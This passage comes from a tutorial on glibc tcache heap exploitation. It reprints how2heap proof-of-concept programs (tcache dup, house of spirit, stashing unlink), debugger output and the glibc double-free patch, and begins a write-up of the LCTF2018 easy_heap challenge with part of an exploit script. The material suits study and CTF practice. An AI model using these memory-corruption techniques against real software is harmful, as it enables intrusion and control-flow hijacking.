07:0038│          0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> i r rax
rax            0x7fffffffdfa8	140737488347048
```
As we can see, the `tcache poisoning` method is similar to fastbin attack, but has a wider exploitation range because there is no size restriction.

#### tcache dup
Similar to `fastbin dup`, but exploits the lax checks in `tcache_put()`
```C
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
As we can see, the checks in `tcache_put()` are also negligible (there is not even a check on `tcache->counts[tc_idx]`), which greatly improves performance while significantly reducing security.

Because there are no checks, we can free the same chunk multiple times, creating a cycled list.

Let's analyze using the [tcache_dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c) example from how2heap. The source code is as follows:
```C
glibc_2.26 [master●] bat ./tcache_dup.c 
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: ./tcache_dup.c
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ 
   4   │ int main()
   5   │ {
   6   │         fprintf(stderr, "This file demonstrates a simple double-free attack with
       │  tcache.\n");
   7   │ 
   8   │         fprintf(stderr, "Allocating buffer.\n");
   9   │         int *a = malloc(8);
  10   │ 
  11   │         fprintf(stderr, "malloc(8): %p\n", a);
  12   │         fprintf(stderr, "Freeing twice...\n");
  13   │         free(a);
  14   │         free(a);
  15   │ 
  16   │         fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
  17   │         fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", ma
       │ lloc(8), malloc(8));
  18   │ 
  19   │         return 0;
  20   │ }
───────┴─────────────────────────────────────────────────────────────────────────────────
```

Let's debug. First free
```asm
pwndbg> n
14		free(a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0x1
 RSI  0x555555756010 ?— 0x1
 R8   0x0
 R9   0x7fffffffb79c ?— 0x1a00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0b0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RIP  0x5555555547fc (main+162) ?— mov    rax, qword ptr [rbp - 0x18]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555547e4 <main+138>    lea    rdi, [rip + 0x171]
   0x5555555547eb <main+145>    call   fwrite@plt <0x555555554630>
 
   0x5555555547f0 <main+150>    mov    rax, qword ptr [rbp - 0x18]
   0x5555555547f4 <main+154>    mov    rdi, rax
   0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
 
 ? 0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
   0x555555554800 <main+166>    mov    rdi, rax
   0x555555554803 <main+169>    call   free@plt <0x555555554600>
 
   0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
   0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
   0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
    9 	int *a = malloc(8);
   10 
   11 	fprintf(stderr, "malloc(8): %p\n", a);
   12 	fprintf(stderr, "Freeing twice...\n");
   13 	free(a);
 ? 14 	free(a);
   15 
   16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
   17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
   18 
   19 	return 0;
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
03:0018│      0x7fffffffdfc8 ?— 0x0
04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfe0 ?— 0x0
07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555756270 (size : 0x20d90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x555555756260
```
The first tcache chain now has one chunk

During the second free, although the same chunk is being freed, the program does not crash because `tcache_put()` does not perform any checks
```asm
pwndbg> n
16		fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x555555756260 ?— 0x555555756260 /* '`buUUU' */
 RDI  0x2
 RSI  0x555555756010 ?— 0x2
 R8   0x1
 R9   0x7fffffffb79c ?— 0x1a00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0b0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RIP  0x555555554808 (main+174) ?— mov    rax, qword ptr [rip + 0x200851]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555547f4 <main+154>    mov    rdi, rax
   0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
 
   0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
   0x555555554800 <main+166>    mov    rdi, rax
   0x555555554803 <main+169>    call   free@plt <0x555555554600>
 
 ? 0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
   0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
   0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
   0x555555554817 <main+189>    lea    rsi, [rip + 0x152]
   0x55555555481e <main+196>    mov    rdi, rax
   0x555555554821 <main+199>    mov    eax, 0
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   11 	fprintf(stderr, "malloc(8): %p\n", a);
   12 	fprintf(stderr, "Freeing twice...\n");
   13 	free(a);
   14 	free(a);
   15 
 ? 16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
   17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
   18 
   19 	return 0;
   20 }
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x555555756260 /* '`buUUU' */
02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
03:0018│      0x7fffffffdfc8 ?— 0x0
04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfe0 ?— 0x0
07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555756270 (size : 0x20d90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x555555756260 --> 0x555555756260 (overlap chunk with 0x555555756250(freed) )
```
As we can see, this method is much simpler compared to `fastbin dup`.

#### tcache perthread corruption
We already know that `tcache_perthread_struct` is the management structure for the entire tcache. If we can control this structure, then regardless of what size we malloc, the address is controllable.

No great examples were found here, so let's consider a hypothetical scenario

Imagine the following heap layout
```
tcache_    +------------+
\perthread |......      |
\_struct   +------------+
           |counts[i]   |
           +------------+
           |......      |          +----------+
           +------------+          |header    |
           |entries[i]  |--------->+----------+
           +------------+          |NULL      |
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```
Through some techniques (such as `tcache poisoning`), we change it to
```
tcache_    +------------+<---------------------------+
\perthread |......      |                            |
\_struct   +------------+                            |
           |counts[i]   |                            |
           +------------+                            |
           |......      |          +----------+      |
           +------------+          |header    |      |
           |entries[i]  |--------->+----------+      |
           +------------+          |target    |------+
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```
This way, after two malloc calls we get back the address of `tcache_perthread_struct`, and can control the entire tcache.

**Because tcache_perthread_struct is also on the heap, this method generally only requires a partial overwrite to achieve the goal.**



#### tcache house of spirit

Let's use the how2heap source code as an example:

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
	fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	fprintf(stderr, "Ok. Let's start with the example!.\n\n");


	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region

	fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```



The goal after the attack is to control the content on the stack. We malloc a chunk, then through a fake chunk on the stack, we free it, and we will find that

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x4052e0 (size : 0x20d20)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffe510 --> 0x401340
```



Tcache now contains a chunk from the stack. Afterwards, we only need to malloc to control this memory.

#### smallbin unlink

When the smallbin contains free chunks, other free chunks of the same size are simultaneously placed into tcache. At this point, an unlinking operation also occurs, but compared to the unlink macro, it lacks chain integrity verification. Therefore, the original unlink operation can also be used under this condition.

#### tcache stashing unlink attack

This attack exploits the fact that when the tcache bin has remaining space (count less than `TCACHE_MAX_BINS`), small bins of the same size will be placed into tcache (this can be triggered by using `calloc` to allocate chunks of the same size, because `calloc` does not retrieve chunks from the tcache bin). After obtaining a chunk from a `smallbin`, if tcache still has enough free space, the remaining small bin chunks are linked into tcache. During this process, only the first bin undergoes an integrity check — subsequent chunks are not checked. When an attacker can write a small bin's bk pointer, they can write a libc address to an arbitrary address (similar to the effect of `unsorted bin attack`). With proper construction, it is also possible to allocate a fake chunk to an arbitrary address.

Let's use `tcache_stashing_unlink_attack.c` from `how2heap` as an example.

We refer to the two chunks in `smallbin[sz]` as chunk0 and chunk1 in the order they were freed. We modify chunk1's `bk` to `fake_chunk_addr`. At the same time, we need to write a writable address `writable_addr` at `fake_chunk_addr->bk` in advance. When calling `calloc(size-0x10)`, chunk0 is returned to the user (because of the smallbin's `FIFO` allocation mechanism). Assuming there are 5 free chunks in `tcache[sz]`, there is enough space to accommodate both `chunk1` and `fake_chunk`. In the source code checks, only the first chunk's linked list integrity is verified with `__glibc_unlikely (bck->fd != victim)` — subsequent chunks are not checked during the insertion process.

Because tcache's allocation mechanism is `LIFO`, the `fake_chunk` at the `fake_chunk->bk` pointer is actually placed at the head of the linked list when linked into tcache. On the next call to `malloc(sz-0x10)`, `fake_chunk+0x10` is returned to the user. At the same time, due to the unlink operation `bin->bk = bck; bck->fd = bin;`, a libc address is written at `writable_addr+0x10`.

```c

#include <stdio.h>
#include <stdlib.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    fprintf(stderr, "This file demonstrates the stashing unlink attack on tcache.\n\n");
    fprintf(stderr, "This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
    fprintf(stderr, "This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    fprintf(stderr, "The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    fprintf(stderr, "This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    fprintf(stderr, "Stack_var emulates the fake chunk we want to alloc to.\n\n");
    fprintf(stderr, "First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    fprintf(stderr, "You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    fprintf(stderr, "Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    fprintf(stderr, "Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 tcache
    fprintf(stderr, "Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    fprintf(stderr, "As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    fprintf(stderr, "Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);//>0x90

    //now 5 tcache bins
    fprintf(stderr, "Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    fprintf(stderr, "Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    fprintf(stderr, "Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    fprintf(stderr, "Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    fprintf(stderr, "As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);
    return 0;
}
```

This PoC uses an array on the stack to simulate a `fake_chunk`. It first constructs a situation with 5 `tcache chunks` and 2 `smallbin chunks`. It simulates a `UAF` vulnerability to modify `bin2->bk` to `fake_chunk`, triggering the attack during `calloc(0x90)`.

We set a breakpoint at `calloc` and check the heap layout before the call. At this point, `tcache[0xa0]` has 5 free chunks. We can see that chunk1->bk has been changed to `fake_chunk_addr`, and `fake_chunk->bk` has also been set to a writable address. Since `smallbin` finds chunks by following the `bk` pointer, the allocation order should be `0x0000000000603250->0x0000000000603390->0x00007fffffffdbc0 (FIFO)`. Calling calloc will return `0x0000000000603250+0x10` to the user.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6038a0 (size : 0x20760) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x0 and 0x603390 is broken)
(0xa0)   tcache_entry[8](5): 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
gdb-peda$ x/4gx 0x603390
0x603390:       0x0000000000000000      0x00000000000000a1
0x6033a0:       0x0000000000603250      0x00007fffffffdbc0
gdb-peda$ x/4gx 0x00007fffffffdbc0
0x7fffffffdbc0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbd0: 0x0000000000000000      0x00007fffffffdbd0
gdb-peda$ x/4gx 0x0000000000603250
0x603250:       0x0000000000000000      0x00000000000000a1
0x603260:       0x00007ffff7dcfd30      0x0000000000603390
gdb-peda$ x/4gx 0x00007ffff7dcfd30
0x7ffff7dcfd30 <main_arena+240>:        0x00007ffff7dcfd20      0x00007ffff7dcfd20
0x7ffff7dcfd40 <main_arena+256>:        0x0000000000603390      0x0000000000603250
```

After calling calloc, checking the heap layout again, we can see that `fake_chunk` has been linked into `tcache_entry[8]`. Because the allocation order becomes `LIFO`, the block at `0x7fffffffdbd0-0x10` has been promoted to the head of the linked list, and `malloc(0x90)` will return this block next time.

Its fd points to the next free chunk. During the unlink process, the assignment operation `bck->fd=bin` writes a libc address at `0x00007fffffffdbd0+0x10`.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6038a0 (size : 0x20760) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x6033a0 and 0x603390 is broken)
(0xa0)   tcache_entry[8](7): 0x7fffffffdbd0 --> 0x6033a0 --> 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
gdb-peda$ x/4gx 0x7fffffffdbd0
0x7fffffffdbd0: 0x00000000006033a0      0x00007fffffffdbd0
0x7fffffffdbe0: 0x00007ffff7dcfd30      0x0000000000000000
```

####  libc leak

In previous libc versions, we only needed to do this:

```c
#include <stdlib.h>
#include <stdio.h>

int main()
{
	long *a = malloc(0x1000);
	malloc(0x10);
	free(a);
	printf("%p\n",a[0]);
} 
```



However, in libc versions after 2.26, we first need to fill the tcache:

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc , char* argv[])
{
	long* t[7];
	long *a=malloc(0x100);
	long *b=malloc(0x10);
	
	// make tcache bin full
	for(int i=0;i<7;i++)
		t[i]=malloc(0x100);
	for(int i=0;i<7;i++)
		free(t[i]);
	
	free(a);
	// a is put in an unsorted bin because the tcache bin of this size is full
	printf("%p\n",a[0]);
} 
```

After that, we can leak libc.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559af0 (size : 0x20510)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x555555559250 (size : 0x110)
(0x110)   tcache_entry[15]: 0x5555555599f0 --> 0x5555555598e0 --> 0x5555555597d0 --> 0x5555555596c0 --> 0x5555555595b0 --> 0x5555555594a0 --> 0x555555559390
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk
0x555555559000      0x0                 0x250                Used                None              None
0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0
0x555555559360      0x110               0x20                 Used                None              None
0x555555559380      0x0                 0x110                Used                None              None
0x555555559490      0x0                 0x110                Used                None              None
0x5555555595a0      0x0                 0x110                Used                None              None
0x5555555596b0      0x0                 0x110                Used                None              None
```



### 0x04 Tcache Check

In the latest libc [commit](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7), the tcache double free check has been updated:

```c
index 6d7a6a8..f730d7a 100644 (file)
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size)
 typedef struct tcache_entry
 {
   struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  struct tcache_perthread_struct *key;
 } tcache_entry;
 
 /* There is one of these for each thread, which contains the
@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)
 {
   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
   assert (tc_idx < TCACHE_MAX_BINS);
+
+  /* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */
+  e->key = tcache;
+
   e->next = tcache->entries[tc_idx];
   tcache->entries[tc_idx] = e;
   ++(tcache->counts[tc_idx]);
@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx)
   assert (tcache->entries[tc_idx] > 0);
   tcache->entries[tc_idx] = e->next;
   --(tcache->counts[tc_idx]);
+  e->key = NULL;
   return (void *) e;
 }
 
@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)
   {
     size_t tc_idx = csize2tidx (size);
 
+    /* Check to see if it's already in the tcache.  */
+    tcache_entry *e = (tcache_entry *) chunk2mem (p);
+
+    /* This test succeeds on double free.  However, we don't 100%
+       trust it (it also matches random payload data at a 1 in
+       2^<size_t> chance), so verify it's not an unlikely coincidence
+       before aborting.  */
+    if (__glibc_unlikely (e->key == tcache && tcache))
+      {
+       tcache_entry *tmp;
+       LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
+       for (tmp = tcache->entries[tc_idx];
+            tmp;
+            tmp = tmp->next)
+         if (tmp == e)
+           malloc_printerr ("free(): double free detected in tcache 2");
+       /* If we get here, it was a coincidence.  We've wasted a few
+          cycles, but don't abort.  */
+      }
+
     if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
```



So far, we have only seen checks during the free operation, and there seem to be no new checks for get.

### 0x05 The pwn of CTF

#### Challenge 1 : LCTF2018 PWN easy_heap

##### Basic Information

The libc in the remote environment is libc-2.27.so, so tcache needs to be considered during the heap chunk allocation and deallocation process.

```shell
zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
[*] '/home/zj/c_study/lctf2018/easy/easy_heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

##### Basic Functionality

0. Input function: reads one byte at a time in a loop. If a null byte or newline character is encountered, it stops reading. Then it zeroes out the current end-of-input position and the size position.
1. new: uses `malloc(0xa8)` to allocate a chunk, records the size, and accepts input content.
2. free: first uses `memset` to zero out the heap chunk based on the recorded size, then performs a regular free
3. show: uses puts for output

The functionality is relatively simple.

The structure used to record a chunk:

```c
struct Chunk {
    char *content;
    int size;
};
```

A structure allocated on the heap is used to record all `Chunk` structures, with a total of 10 blocks that can be allocated.

The program's input function has a null-byte-overflow vulnerability. See the following code for details

```c
unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
{
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  i = 0;                                        
  if ( sz )
  {
    while ( 1 )
    {
      read(0, &malloc_p[i], 1uLL);
      if ( sz - 1 < i || !malloc_p[i] || malloc_p[i] == '\n' )
        break;
      ++i;
    }
    malloc_p[i] = 0;
    malloc_p[sz] = 0;                           // null-byte-overflow
  }
  else
  {
    *malloc_p = 0;
  }
  return __readfsqword(0x28u) ^ v4;
}
```

##### Exploitation Approach

Due to the existence of tcache, its presence needs to be considered during the exploitation process.

Generally speaking, when a null-byte-overflow vulnerability appears in a heap program, the approach is to construct overlapping heap chunks, allowing the overlapping chunk to be used multiple times to achieve information leakage and ultimately hijack the control flow.

The null-byte-overflow exploitation method works by overwriting the prev_in_use byte through overflow to trigger chunk consolidation, then using a forged prev_size field to cause chunk overlap during consolidation. However, in this challenge, since the input function cannot accept NULL characters, it is impossible to input prev_size values containing 0x00 bytes, and the chunk allocation size is fixed. Therefore, the null-byte-overflow method cannot be directly used for exploitation — another method is needed to write prev_size.

When there is no way to manually write prev_size but prev_size must be used for exploitation, consider using the system-written prev_size.

The method is: during unsorted bin consolidation, prev_size is written, and this prev_size will not be easily overwritten (unless a new prev_size needs to be written), so this prev_size can be used for exploitation.

Specific process:

1. Free three unsorted bin chunks `A -> B -> C` in sequence
2. A and B consolidate, at this point the prev_size before C is written as 0x200
3. A, B, and C consolidate, the 0x200 written in step 2 is still preserved
4. Use unsorted bin splitting to allocate A 
5. Use unsorted bin splitting to allocate B, making sure not to overwrite the previous 0x200
6. Free A again into the unsorted bin, so that fd and bk become valid linked list pointers
7. At this point, the prev_size before C is still 0x200 (an unused value). The situation of A, B, C is: `A (free) -> B (allocated) -> C (free)`. If B overflows, the allocated B chunk can be included within the consolidated free unsorted bin chunk.

However, during this process, the impact of tcache needs to be considered.

##### Exploitation Steps

###### Rearrange heap structure, free unsorted bin chunks

Since this challenge only allows 10 allocatable chunks, and throughout the process we need 3 unsorted bin chunks plus 7 tcache chunks, we need to rearrange by placing one tcache chunk between the 3 unsorted bin chunks and the top chunk, otherwise it would trigger consolidation with the top chunk.

```python
    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)
```

Heap structure after reallocation:

```
+-----+
|     | <-- tcache perthread struct
+-----+
| ... | <-- 6 tcache chunks
+-----+
|  A  | <-- 3 unsorted bin chunks
+-----+
|  B  |
+-----+
|  C  |
+-----+
|     | <-- tcache chunk, prevents top consolidation
+-----+
| top |
|  .. |
```

###### Trigger NULL byte overflow following the steps described in the analysis

To trigger the NULL byte overflow, we need chunk B from the analysis to be able to overflow into chunk C. Since the challenge has no edit functionality, we need to put chunk B into tcache, so it can be allocated again after being freed. Since tcache doesn't have many changes or checks, this will be relatively stable.

